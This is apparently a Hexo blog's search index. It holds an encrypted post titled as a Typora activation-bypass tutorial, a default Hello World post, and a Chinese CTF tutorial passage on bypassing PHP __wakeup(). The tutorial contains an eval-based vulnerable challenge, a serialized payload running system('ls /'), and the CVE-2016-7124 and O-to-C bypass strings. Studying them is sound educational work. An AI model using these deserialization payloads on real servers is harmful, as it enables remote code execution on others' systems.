<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>typora免激活教程</title>
      <link href="/2025/02/06/typora%E5%85%8D%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"/>
      <url>/2025/02/06/typora%E5%85%8D%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1dfe6cbb1099d504d22e3af6fa070a897c787ab0a1156ae10787aee5ea1ce422">fcf40df285a6800274cd5db4b97261b3a9ae9e237c7d7ec492065137575de76ed08f12b8f5e8711d6c1a13b2a0bcb95ac3bba52a46c05596bb23e59350e734079d970f69c7bb3d3e7e8a8b651a5b1ca71113c72034a772a95546c204aa2b5233dfee94accfd6e4c62ce99800d4eabfdedf9060c1d23eb70ca0adc069092647cc89d8a40504bb112c9bdec7206a454f4fbeb3767d7043925265832b9618c5a440bd090e933fd76a2c408615f8e9483ffcc9f93cb20d3ea4545d3a581b389797299259ba2ff2c3c021b4c20eaca987096c1b64943a61b0f402dacad4861edaee3a16ceea1fa545d609b5fed907a328d9534785b359d63ac5850463ea5ce6662f872d256480e457197303ec3435b8184ea7d68acc1c580090eba77ba15d941cdeb861a5bc6b24cd5b45a0f28a8cb1aa021695d790a9d16f30456a562f3325748d476e54d7709fa5777f9d57eab780379d8648f8ed884b9c44a6235ee21ad50335d56c15dd7b2287278550e88731ae57a1a7f729efe514071208a7120ecdade7d24ab690611dfff1c979400ec3aee3c91b50b9b3f7f29c5bececba497895210d2aab5d6df172021d0234070df75be3709d70d5c2cfce10d0d51bd058b28e957451edab1a4ccd914a5cb784fe8941c3e53f930176ca84b566b98d92935435e70e1c5934343fe203abf2a2b17ce14ed665bc5e3df69db31958cae94f4b5c3443dfed9f133627b0f2f815bae1854f57448c84e83c0fc27ab751796e7b723326433296ccd8a7cdaa4ae58723120ddf7a67fe83268578dc6be218a121aeb3f736c1caf35cb853451ad02d68dfee5b6525b95c77a4de36f6761310e046baa7397af8ad20ff8ac6cac7a145f659ec1bd263b7614478faa23d10a699f582c3db834f2a2797041369bfeac722c600a021942ba89bb810c078bce457148a9fb8d0ef9b6e7732c6c686362804b8639fb22bcfd8c4b33141519fe66440aaa304caddd0b55b32ba153ba157ccbfa5009d2fecf5e27ec6038098e9612987d67620f68e602cc3410ce6a8bf80821c26fc73e5a894c432d4a665f71079641a76e526128a690ef6233464601deb6f95c086601ef343cefa506fc2dfee16e2ebfb676f03dab764a3d3c4e7c810be3d30e0bf954f9c78fe78a5e9303036585236847f285a19398f4f4d6712b9cb0cbe577f32c4810cc2d9391a2529bb89a31326169f83ae1ef6204beb94e47d1c85adbbc8ecb257e81a887a92972540c0220c2e8f2e4d29b03dd7d3757cb39e271b716a8fd9a516fa0b8308e04114222137d2ed04f47b8f101d0d420540b8546f8b97c3300dd65620c2c4ffb4c15f30de462b76dcd10dbffbe7436b9f0d549d912084de2cedbc88eb11492dd7476186ad990dc27eb82a15da481ec655eb9475d6ad7ab59a1692a32f9e93164d0bb204986be9c20b3db1e437affb8e19a51cceacc0b85c9c3238dda57da4b0e36a167965d863fd62a3f200f8a7416ac66067fc7790ca15ee0a9957f859bc0d7b7582cee4501a5f07a4be8f6137e055ef6c6175c1c002ed1717574b5cf4a4d7d961a28ba03ebc9da820880c8e5c1833dcb3666858074df9aeb3259a3fbca317bf002927fb7beb680f8e4ae36483f5e1ea37a938f8c3a4039d17470e22cedd6be4773284116f7008f115582abb59e13ed41c39887b9078ab0a5f0c2181d97d33b753483cb71c290ee7b61f31f7936c71c057dd6613aea3edae137b2d1a0860e8d393590968ddfdd68c98cab677849c14af3ba07bb6528d9953dfd5c8fd6c77ecf3304799f72089417d107d5470c405bd46fb3bf47344ebd1905f9a26583b8ca513675abf78d9c7a5e2aeff24753b8f7e09b31497b0c5d99f521354ba4412f87cd150d4e2eb9c3ddeb8fc2ba4357a4eb55d5c66c938b64908c5748888ea160fb737f00f3681b72fe2dc370a62f7229f74b3c8bfb577731fd7549f67de3952e0f51fd014e713d80e667c6d91bcc357997eb56ce1741f148243ebc60a0c9f40259696dbf8bb8f9679aa73bceedc3d232c0966b173b9ba72a82c08dd35a79ca72b9b4384db6066a6bbc24cabd4626116421d2b6f5a1f825eea13e9af87a28f60ad4b2252468d97398e951cdbcc7a04ebe21448f260ea1c68c8ecb4f20fb64f38293da45f9b8d3027919775668a3143d294e63fad97736c3849812a1a1be3cf0192414a9516a95fe5ae5845abad85ec114591461aee810fd1c0f396f205c11acf827ccea4ce6a5903389b0f6f6186edaba11711b4075ef92c266a904ee4f2e33268b894f19ac0785fc8b4a40845554c3101cfaecadf61d2bc2d72eb13ebde60bfec0486e27b9d7a5388621544127a96e0c5e1aec579bf68fc4cd0eadf8830cbe67dd456879f6d359e810900c5c0ddc4683889b4b017de1d925c8867e074a0e8c85d4f6985f5d18194958bc541e4681b1fb7ac51ea0818cf605313f8409ad9565637e9b2dd2c47dd56f78aa43b156a2c0cd1da0316f364b19d0c875e2d70f395df9375dd51c2e9fac7bc34a57324bc7f26f4e90770e67273d66e1800929fa25060f6c663bd23d5d0585fb5e7e0af532baa201f2adb5d0b01176875f6ae3eb8e9f7eca319920e2fd54aca1019bbcd767b4923fccb302dfca34370cc894741d239d9384a908bb7d88097daa0ff5c8a7537eced41ef3e6de1481fcb31d2d7dabaf30c0ad021a4d8d917caf64b5e6f152970dc354444e58cea09da4619446e156091f50056f0513a0500245857511cab7faff92fcb5fdb00647f9d89f48ad2708c9cd3b3455dcfa53a1c59f67f24634dc12d97b9782c3ae3d153b05a6fa92262e4a06cba1230cec2d0a773d1d1fe2a5fd47fede67706d36c0e408c6a62c1f60610f1d7f8a408db5a9bc8d41747feda94ad7dc798c6b6c8e653f31085a380128cd0708bc5d499ccabf8f75194d25153ecb793d38e87fedab82528f14846603b65789d5993532cfb2ca3850ae49b13588ba341bc90d952d39ee06090bf6ac882179c18b42832024d304150aacd3aa202f798c7eb913ea1ac3eacac9c17dc3cedeb711cdbfc92cd3984633f40f409ca9a7f64108f8a32fe0db5c72debcde3fd253eb49cf7b19b7aae73b948e0993be858291f936cc9facaf489a36615d52828b402fce5a4bc20bb0970733703648b47dc42b6decec3958ed6b33c679d41474db462ffed05d9c16a40d445a29f27bb67b860addbdba2f452cb562b08bc4f738f6c74434abd268a875765f0ca1904781823725dc949e8862583ab5766fbdc5891d2944000db8a23b73c31717e39368fad289caeb9d7987eaf4f2f540fff432d64135c30231c71b0c6fb44d85f1adbf3ad90a276d0f9cdbf172b2e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">null</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 工具教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/12/09/hello-world/"/>
      <url>/2024/12/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP绕过__wakeup()方法</title>
      <link href="/2024/06/26/php%E7%BB%95%E8%BF%87wakeup%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/26/php%E7%BB%95%E8%BF%87wakeup%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在PHP序列化和反序列化中wakeup都扮演着重要角色，但是在实际的挖洞或者ctf题目中很少出现直接利用wakeup进行反序列化利用的链子，通常都需要对wakeup方法进行绕过，这里就做一个简单的总结</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h3><blockquote><p>两个变量同时指向同一个地址</p></blockquote><h4 id="例题-UUCTF-2022-新生赛-ez-unser"><a href="#例题-UUCTF-2022-新生赛-ez-unser" class="headerlink" title="例题 [UUCTF 2022 新生赛]ez_unser"></a>例题 [UUCTF 2022 新生赛]ez_unser</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于这个代码，利用点很明显在eval处，但是存在wakeup函数会让a变量直接置空，同时观察到destruct方法中存在<code>$this-&gt;b=$this-c</code>，所以就存在可利用的地方</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;c=<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;b=&amp;<span class="variable">$t</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016102649333.png" alt="image-20241016102649333"></p><p>利用结果</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016102702644.png" alt="image-20241016102702644"></p><h3 id="属性个数不匹配（CVE-2016-7124）"><a href="#属性个数不匹配（CVE-2016-7124）" class="headerlink" title="属性个数不匹配（CVE-2016-7124）"></a>属性个数不匹配（CVE-2016-7124）</h3><p>序列化格式字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;N;&#125;s:<span class="number">4</span>:<span class="string">&quot;Aend&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>意义为：O：对象，一个字符，类名叫A，两个属性，info和类B</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    public $Aend;</span><br><span class="line"></span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public  $end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$a-&gt;info = new B();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>此时给a加一个wakeup函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aend</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$end</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new A();</span></span><br><span class="line"><span class="comment">//$a-&gt;info = new B();</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:3:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;N;s:1:&quot;a&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>正常说我们是要调用B类的，所以B加了一个析构函数当B类被调用结束时候会执行，当我们反序列化时候，会先走A类的wakeup函数，此时die掉整个程序过程，无法达到我们的目的，所以就可以使用该方法绕过wakeup函数，具体操作为在A类后属性个数修改为比实际值大即可</p><blockquote><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;N;&#125;s:<span class="number">4</span>:<span class="string">&quot;Aend&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241018103646811.png" alt="image-20241018103646811"></p><h3 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h3><blockquote><p>O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。</p></blockquote><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup is running...\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct is running...\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct is running...\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">demo</span>());</span><br><span class="line"><span class="variable">$t</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>, <span class="string">&quot;C:&quot;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t</span>.<span class="string">&quot;\n&quot;</span>;<span class="comment">//C:4:&quot;demo&quot;:0:&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016134519725.png" alt="image-20241016134519725"></p><p>可以看到在序列化时候实例化类会先调用<code>__construct</code>方法，之后再调用 <code>__destruct</code>方法，而在经过O变C之后，wakeup并不会执行，而是直接执行了<code>__destruct</code>方法。</p><blockquote><p>当O被替换成了C以后，这里生成的序列化字符串被认为是一个可调用对象的字符串，而不是一个普通对象。当我们将他反序列化的时候，它会被转换为一个匿名函数，并成为可调用对象。</p><p>可调用对象是不允许有属性的，因此在序列化字符串中包含属性的情况下，反序列化操作会忽略这些属性，但是我们这里是直接不能序列化的了。</p></blockquote><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>C这个标识符，其实也是代表实现了 Serializable接口的类</p><p>因为实现Serializable接口，我们必须要重写serialize和unserialize方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAAA</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;name&quot;</span>=&gt;<span class="variable">$this</span>-&gt;name,</span><br><span class="line">            <span class="string">&quot;age&quot;</span>=&gt;<span class="variable">$this</span>-&gt;age</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$data</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">AAAA</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="D:\blog\php绕过wakeup进行反序列化总结.assets\image-20241016143026139.png" alt="image-20241016143026139"></p><p>可以看到在进行到最后var_dump操作之后才进入了destruct方法，说明在中间是一直在使用的</p><blockquote><p>首先，有C在的情况，他会先检测这里类是否实现了Serializable接口</p><p>如果有的话，他会将里面的值传入我们重写的unserialize方法中，就是这一串</p><p><code>a:2:&#123;s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;i:13;&#125;</code><br>这个我们知道是可以正常解析的，所以我们可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。</p></blockquote><h4 id="所有PHP内置实现serializable接口的类"><a 